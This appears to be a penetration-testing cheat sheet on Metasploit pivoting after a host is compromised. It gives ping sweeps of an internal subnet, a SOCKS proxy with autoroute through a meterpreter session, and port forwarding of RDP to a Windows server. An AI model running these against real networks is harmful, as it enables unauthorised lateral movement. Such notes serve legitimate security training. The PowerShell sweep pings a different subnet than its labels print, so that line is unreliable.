# Ⓜ️ Metasploit

To do a ping sweep post exploitation:

```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

Manually

{% code title="Linux" %}
```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
{% endcode %}

{% code title="CMD" %}
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
{% endcode %}

{% code title="Powershell" %}
```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```
{% endcode %}

## Proxy

Suppose wanna use a pivot host to access one more machine use this technique to get all meterpreter goodies:

{% code title="/etc/proxychains.conf socks4 127.0.0.1 9050" %}
```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
```
{% endcode %}

Then to route all traffic through meterpreter

```shell-session
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

Can also be run directly in the meterpreter session: &#x20;

```shell-session
meterpreter > run autoroute -s 172.16.5.0/23
```

\
Port Forwarding
---------------

```shell-session
meterpreter > help portfwd
```

```shell-session
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

The above command requests the Meterpreter session to start a listener on our attack host's local port (`-l`) `3300` and forward all the packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session'

